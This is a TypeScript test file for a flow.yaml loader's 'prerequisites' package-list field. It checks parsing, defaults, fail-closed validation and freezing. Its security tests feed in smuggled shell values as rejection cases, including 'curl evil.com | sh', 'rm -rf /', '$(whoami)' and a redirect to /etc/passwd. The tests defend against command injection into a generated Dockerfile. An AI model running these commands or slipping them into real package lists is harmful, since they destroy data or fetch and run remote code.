/**
 * Tests for the flow.yaml `prerequisites:` field (WI-434).
 *
 * A flow.yaml may declare `prerequisites: [ffmpeg, git]` — the list of system
 * package names a flow's stations need at runtime. The loader must:
 *
 *   - surface a valid list on the frozen FlowConfig as `prerequisites: string[]`
 *   - default to an empty array when the field is absent (absent is legal)
 *   - reject (fail-closed) any present-but-malformed value with a structured
 *     error whose code is INVALID_PREREQUISITES, producing NO FlowConfig
 *
 * This field is the single source of truth consumed by `conduit build`
 * (apt-get list) and `conduit doctor` (prereq-present probe), so a malformed
 * value must be caught at load rather than silently coerced — mirroring the
 * INVALID_CAP_POLICY fail-closed pattern in load.ts.
 *
 * Contract pinned for src/flow/load.ts (already established by load.test.ts):
 *
 *   export function loadFlow(absolutePath: string): LoadFlowResult   // synchronous
 *   export type LoadFlowResult =
 *     | { ok: true;  flow: FlowConfig }
 *     | { ok: false; errors: FlowValidationError[] }
 */
import { describe, it, expect } from 'bun:test';
import { join, dirname } from 'node:path';
import { mkdtempSync, mkdirSync, writeFileSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import type { FlowConfig } from '../types/kernel';
import { loadFlow, type LoadFlowResult } from './load';

// ---------------------------------------------------------------------------
// Helpers — mirror load.test.ts's inline-fixture style so these tests are
// self-contained (no shared fixture files to maintain).
// ---------------------------------------------------------------------------

/** Write `yaml` to a throwaway temp file and load it. */
function loadInline(yaml: string): LoadFlowResult {
  const dir = mkdtempSync(join(tmpdir(), 'conduit-prereq-'));
  const path = join(dir, 'flow.yaml');
  try {
    writeFileSync(path, yaml, 'utf-8');
    return loadFlow(path);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
}

/** Narrow to the success branch, failing the test (with detail) otherwise. */
function expectOk(result: LoadFlowResult): FlowConfig {
  if (!result.ok) {
    throw new Error(`expected ok, got errors: ${JSON.stringify(result.errors)}`);
  }
  return result.flow;
}

/** Narrow to the failure branch, failing the test otherwise. */
function expectErrors(result: LoadFlowResult): { code: string; message: string }[] {
  if (result.ok) {
    throw new Error('expected validation errors, but load succeeded');
  }
  return result.errors;
}

/** All error codes — used to assert a specific code is present. */
function errorCodes(result: LoadFlowResult): string[] {
  return expectErrors(result).map((e) => e.code);
}

/** All error messages joined — used to assert an error "names" a given value. */
function errorText(result: LoadFlowResult): string {
  return expectErrors(result)
    .map((e) => e.message)
    .join(' | ');
}

/**
 * Base flow.yaml with a single valid station, parameterized on the
 * `prerequisites:` line. Pass an empty string to omit the field entirely.
 */
const withPrereqs = (prereqLine: string): string => `
flow: prereq
flow_version: 1
terminal_lanes: [done, scrap, hold]
${prereqLine}
stations:
  - id: a
    worker: { kind: transform }
`;

// ---------------------------------------------------------------------------
// AC1 — a valid prerequisites list is surfaced on FlowConfig, deep-equal and
//        order-preserving.
// ---------------------------------------------------------------------------

describe('loadFlow — prerequisites parsing (AC1)', () => {
  it('surfaces prerequisites: [ffmpeg, git] as ["ffmpeg","git"]', () => {
    const flow = expectOk(loadInline(withPrereqs('prerequisites: [ffmpeg, git]')));
    expect(flow.prerequisites).toEqual(['ffmpeg', 'git']);
  });

  it('preserves declaration order of the prerequisites list', () => {
    const flow = expectOk(loadInline(withPrereqs('prerequisites: [git, ffmpeg]')));
    expect(flow.prerequisites).toEqual(['git', 'ffmpeg']);
  });
});

// ---------------------------------------------------------------------------
// AC2 — absent is legal: prerequisites defaults to an empty array.
//        (Positive default + the negative of the fail-closed rule below.)
// ---------------------------------------------------------------------------

describe('loadFlow — prerequisites default (AC2)', () => {
  it('defaults prerequisites to an empty array when the field is absent', () => {
    const flow = expectOk(loadInline(withPrereqs('')));
    expect(flow.prerequisites).toEqual([]);
  });

  it('accepts an explicitly empty prerequisites list as a legal empty array', () => {
    const flow = expectOk(loadInline(withPrereqs('prerequisites: []')));
    expect(flow.prerequisites).toEqual([]);
  });
});

// ---------------------------------------------------------------------------
// AC3 — prerequisites that is not an array is rejected fail-closed, with no
//        FlowConfig produced.
// ---------------------------------------------------------------------------

describe('loadFlow — non-array prerequisites is rejected (AC3)', () => {
  it('rejects a bare string prerequisites with code INVALID_PREREQUISITES', () => {
    const result = loadInline(withPrereqs("prerequisites: 'ffmpeg'"));
    expect(result.ok).toBe(false);
    expect(result).not.toHaveProperty('flow');
    expect(errorCodes(result)).toContain('INVALID_PREREQUISITES');
  });

  it.each([
    ['a bare string', "prerequisites: 'ffmpeg'"],
    ['a number', 'prerequisites: 42'],
    ['a mapping', 'prerequisites: { ffmpeg: true }'],
  ])('rejects %s prerequisites with code INVALID_PREREQUISITES', (_label, line) => {
    const result = loadInline(withPrereqs(line));
    expect(result.ok).toBe(false);
    expect(errorCodes(result)).toContain('INVALID_PREREQUISITES');
  });
});

// ---------------------------------------------------------------------------
// AC4 — a prerequisites array with a non-string entry is rejected fail-closed.
//        Every entry is checked, not just the first.
// ---------------------------------------------------------------------------

describe('loadFlow — non-string prerequisites entry is rejected (AC4)', () => {
  it('rejects [123] with code INVALID_PREREQUISITES and names the bad value', () => {
    const result = loadInline(withPrereqs('prerequisites: [123]'));
    expect(result.ok).toBe(false);
    expect(result).not.toHaveProperty('flow');
    expect(errorCodes(result)).toContain('INVALID_PREREQUISITES');
    expect(errorText(result)).toContain('123');
  });

  it('rejects a mixed list with a trailing non-string entry [ffmpeg, 123]', () => {
    // Catches an impl that only validates the first entry: a valid leading
    // string must not mask a later non-string.
    const result = loadInline(withPrereqs('prerequisites: [ffmpeg, 123]'));
    expect(result.ok).toBe(false);
    expect(errorCodes(result)).toContain('INVALID_PREREQUISITES');
  });

  it('rejects a list whose only invalid entry is a boolean [true]', () => {
    const result = loadInline(withPrereqs('prerequisites: [true]'));
    expect(result.ok).toBe(false);
    expect(errorCodes(result)).toContain('INVALID_PREREQUISITES');
  });
});

// ---------------------------------------------------------------------------
// AC6 — each entry must be a safe package name (security: prerequisites are
//        interpolated into `RUN apt-get install -y <entry>` in the generated
//        Dockerfile, so a shell-metacharacter entry is a command-injection
//        vector and must be rejected fail-closed at load).
// ---------------------------------------------------------------------------

describe('loadFlow — prerequisites entries must be safe package names (AC6)', () => {
  it('rejects a shell-injection entry and produces NO FlowConfig', () => {
    const result = loadInline(withPrereqs('prerequisites: ["jq; curl evil.com | sh"]'));
    expect(result.ok).toBe(false);
    expect(result).not.toHaveProperty('flow');
    expect(errorCodes(result)).toContain('INVALID_PREREQUISITES');
  });

  it.each([
    ['a semicolon command chain', 'prerequisites: ["jq; rm -rf /"]'],
    ['a pipe to a shell', 'prerequisites: ["foo | sh"]'],
    ['command substitution backticks', 'prerequisites: ["`id`"]'],
    ['a dollar subshell', 'prerequisites: ["$(whoami)"]'],
    ['an embedded space', 'prerequisites: ["foo bar"]'],
    ['an ampersand', 'prerequisites: ["foo && bar"]'],
    ['a redirect', 'prerequisites: ["foo > /etc/passwd"]'],
    ['an empty string', 'prerequisites: [""]'],
    ['a leading dash (apt option injection)', 'prerequisites: ["-y"]'],
  ])('rejects %s with code INVALID_PREREQUISITES', (_label, line) => {
    const result = loadInline(withPrereqs(line));
    expect(result.ok).toBe(false);
    expect(errorCodes(result)).toContain('INVALID_PREREQUISITES');
  });

  it('accepts legitimate Debian package names (digits, + . : _ -)', () => {
    // Real apt package names: g++, version-pinned, arch-qualified, dotted.
    const flow = expectOk(
      loadInline(
        withPrereqs('prerequisites: [ffmpeg, git, "g++", "python3.11", "libc6:amd64", foo-bar, lib_foo]'),
      ),
    );
    expect(flow.prerequisites).toEqual([
      'ffmpeg',
      'git',
      'g++',
      'python3.11',
      'libc6:amd64',
      'foo-bar',
      'lib_foo',
    ]);
  });

  it('names the offending entry in the error message', () => {
    const result = loadInline(withPrereqs('prerequisites: [ffmpeg, "evil; sh"]'));
    expect(result.ok).toBe(false);
    expect(errorText(result)).toContain('evil; sh');
  });
});

// ---------------------------------------------------------------------------
// AC5 — the field is present on the returned, frozen FlowConfig.
// ---------------------------------------------------------------------------

describe('loadFlow — prerequisites is part of the frozen FlowConfig (AC5)', () => {
  it('includes prerequisites on the returned flow object', () => {
    const flow = expectOk(loadInline(withPrereqs('prerequisites: [ffmpeg, git]')));
    expect(Array.isArray(flow.prerequisites)).toBe(true);
    expect(flow.prerequisites).toContain('ffmpeg');
  });

  it('returns a frozen flow whose prerequisites cannot be reassigned', () => {
    const flow = expectOk(loadInline(withPrereqs('prerequisites: [ffmpeg]')));
    expect(Object.isFrozen(flow)).toBe(true);
    // ESM runs in strict mode — writing to a frozen object throws.
    expect(() => {
      (flow as unknown as Record<string, unknown>).prerequisites = ['tampered'];
    }).toThrow();
  });

  it('deeply freezes the prerequisites array so it cannot drift via mutation', () => {
    const flow = expectOk(loadInline(withPrereqs('prerequisites: [ffmpeg, git]')));
    // The array is the single source of truth consumed by `conduit build`
    // (apt-get list) and `conduit doctor` (prereq probe) — "it must not drift."
    // A shallow Object.freeze(flow) leaves the array itself mutable, so a stray
    // .push() would silently corrupt that source of truth. The array must be
    // frozen too.
    expect(Object.isFrozen(flow.prerequisites)).toBe(true);
    expect(() => flow.prerequisites!.push('tampered')).toThrow();
  });
});
